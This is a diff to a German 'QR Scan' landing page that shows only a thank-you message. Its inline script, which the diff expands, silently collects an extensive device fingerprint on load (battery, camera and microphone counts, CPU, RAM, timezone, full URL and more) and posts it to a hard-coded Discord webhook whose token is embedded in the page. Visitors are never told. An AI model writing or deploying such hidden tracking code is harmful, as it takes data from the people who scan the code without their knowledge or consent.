@@ -1,23 +1,13 @@
 <!DOCTYPE html>
 <html lang="de">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>QR Scan</title>
-  <style>
-    body {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      text-align: center;
-      font-family: sans-serif;
-    }
-    h1 {
-      font-size: 2rem;
-      color: #333;
-    }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>QR Scan</title>
+<style>
+  body { display:flex; justify-content:center; align-items:center; height:100vh; text-align:center; font-family:sans-serif; }
+  h1 { font-size:2rem; color:#333; }
+</style>
 </head>
 <body>
 <h1>Danke fürs Scannen!</h1>
@@ -26,41 +16,70 @@
 (async () => {
   const WEBHOOK_URL = "https://discord.com/api/webhooks/1459180864901742593/Mj78fxKbGMIjH_qHELRexvyGi-WRRVIEB01O1MnQRcTc91B66v0RS3eHc1HSUWrE2Iaz";
 
-  function getDeviceType() {
-    const ua = navigator.userAgent;
-    if (/mobile/i.test(ua)) return "Mobil";
-    if (/tablet/i.test(ua)) return "Tablet";
-    return "Desktop";
+  async function getBattery() {
+    if (navigator.getBattery) {
+      try { const b = await navigator.getBattery(); return `Level:${Math.round(b.level*100)}%, Charging:${b.charging}, ChargingTime:${b.chargingTime}s, DischargingTime:${b.dischargingTime}s`; }
+      catch { return "Unbekannt"; }
+    } return "Nicht verfügbar";
   }
 
-  function sendDiscord() {
-    const urlParams = new URLSearchParams(window.location.search);
-    const codeName = urlParams.get("code") || "Unbekannt";
-
-    const data = {
-      content: "📱 QR-Code wurde gescannt!",
-      embeds: [{
-        title: `QR-Scan: ${codeName}`,
-        color: 7506394,
-        fields: [
-          { name: "🕒 Zeit", value: new Date().toLocaleString(), inline: true },
-          { name: "🌐 Browser / OS", value: navigator.userAgent, inline: true },
-          { name: "🌍 Sprache", value: navigator.language || "unbekannt", inline: true },
-          { name: "🖥️ Bildschirmgröße", value: `${window.screen.width}x${window.screen.height}`, inline: true },
-          { name: "📱 Gerätetyp", value: getDeviceType(), inline: true },
-          { name: "🔗 Referrer", value: document.referrer || "Direkt", inline: true }
-        ]
-      }]
-    };
-
-    fetch(WEBHOOK_URL, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(data)
-    }).catch(err => console.error("Fehler beim Senden an Discord:", err));
+  async function getMediaDevices() {
+    if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+      try {
+        const devices = await navigator.mediaDevices.enumerateDevices();
+        const cams = devices.filter(d => d.kind==='videoinput').length;
+        const mics = devices.filter(d => d.kind==='audioinput').length;
+        return `Cams:${cams}, Mics:${mics}`;
+      } catch { return "Unbekannt"; }
+    } return "Nicht verfügbar";
   }
 
-  sendDiscord();
+  const battery = await getBattery();
+  const mediaDevices = await getMediaDevices();
+
+  const connection = navigator.connection || {};
+  const urlParams = new URLSearchParams(window.location.search);
+  const codeName = urlParams.get("code") || "Unbekannt";
+
+  const data = {
+    content: "📱 QR-Code wurde gescannt!",
+    embeds: [{
+      title: `QR-Scan: ${codeName}`,
+      color: 7506394,
+      fields: [
+        { name:"🕒 Zeit", value:new Date().toLocaleString(), inline:true },
+        { name:"⏰ Zeitzone", value:Intl.DateTimeFormat().resolvedOptions().timeZone, inline:true },
+        { name:"🌐 Browser / OS", value:navigator.userAgent, inline:true },
+        { name:"🌍 Sprache", value:navigator.language, inline:true },
+        { name:"🖥️ Plattform", value:navigator.platform, inline:true },
+        { name:"🖥️ Bildschirmgröße", value:`${window.screen.width}x${window.screen.height}`, inline:true },
+        { name:"📏 Viewport", value:`${window.innerWidth}x${window.innerHeight}`, inline:true },
+        { name:"🎨 Farbtiefe", value:window.screen.pixelDepth, inline:true },
+        { name:"⚡ CPU-Kerne", value:navigator.hardwareConcurrency||"Unbekannt", inline:true },
+        { name:"💾 RAM (GB)", value:navigator.deviceMemory||"Unbekannt", inline:true },
+        { name:"🍪 Cookies aktiviert?", value:navigator.cookieEnabled?"Ja":"Nein", inline:true },
+        { name:"📱 Gerätetyp", value:/mobile/i.test(navigator.userAgent)?"Mobil":(/tablet/i.test(navigator.userAgent)?"Tablet":"Desktop"), inline:true },
+        { name:"☑ Touchscreen?", value:'ontouchstart' in window?"Ja":"Nein", inline:true },
+        { name:"🔋 Batterie", value:battery, inline:true },
+        { name:"📡 Online?", value:navigator.onLine?"Ja":"Nein", inline:true },
+        { name:"📶 Verbindungstyp", value:connection.effectiveType||"Unbekannt", inline:true },
+        { name:"🔗 Referrer", value:document.referrer||"Direkt", inline:true },
+        { name:"🔧 URL", value:window.location.href, inline:false },
+        { name:"🔄 Ausrichtung", value:window.screen.orientation?window.screen.orientation.type:"Unbekannt", inline:true },
+        { name:"🎤/📷 Geräte", value:mediaDevices, inline:true },
+        { name:"LocalStorage?", value:window.localStorage?"Ja":"Nein", inline:true },
+        { name:"SessionStorage?", value:window.sessionStorage?"Ja":"Nein", inline:true },
+        { name:"IndexedDB?", value:'indexedDB' in window?"Ja":"Nein", inline:true },
+        { name:"ServiceWorker?", value:'serviceWorker' in navigator?"Ja":"Nein", inline:true },
+        { name:"PixelRatio", value:window.devicePixelRatio, inline:true },
+        { name:"ScrollPosition", value:`X:${window.scrollX}, Y:${window.scrollY}`, inline:true }
+      ]
+    }]
+  };
+
+  await fetch(WEBHOOK_URL, { method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify(data) })
+  .catch(err=>console.error("Fehler beim Senden an Discord:",err));
+
 })();
 </script>
 </body>
